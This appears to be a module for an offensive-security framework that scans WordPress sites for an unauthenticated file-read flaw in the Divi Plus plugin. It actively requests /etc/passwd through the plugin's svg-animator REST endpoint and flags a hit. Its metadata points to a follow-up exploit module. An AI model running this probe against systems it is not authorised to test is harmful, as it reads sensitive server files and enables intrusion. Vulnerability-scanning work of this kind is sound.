#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Divi Plus <= 2.4.0 unauth file read (CVE-2026-91136)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "divi-plus"
_VULN_HIGH = (2, 4, 0)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Divi Plus CVE-2026-91136 detect",
        "description": (
            "Detects unauthenticated /wp-json/elicus/v1/dipl-modules/svg-animator file read."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-91136",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-91136"],
        "modules": ["auxiliary/admin/http/divi_plus_cve_2026_91136_file_read"],
        "tags": ["web", "scanner", "wordpress", "divi-plus", "lfi", "cve-2026-91136"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["auxiliary/admin/http/divi_plus_cve_2026_91136_file_read"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    read_path = OptString("/etc/passwd", "File path for active probe", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home or "/wp-content/plugins/divi-plus/" not in (home.text or ""):
            return False
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        target = (self.read_path or "/etc/passwd").strip()
        resp = self.http_request(
            method="GET",
            path=self._join("/wp-json/elicus/v1/dipl-modules/svg-animator"),
            params={"svg_image": target},
            allow_redirects=False,
        )
        body = resp.text or "" if resp else ""
        if resp and int(resp.status_code or 0) == 200 and re.search(r"root:.*:0:0:", body):
            self.set_info(
                severity="high",
                reason="Divi Plus svg-animator arbitrary file read",
                path="/wp-json/elicus/v1/dipl-modules/svg-animator",
                cve="CVE-2026-91136",
            )
            return True
        return False
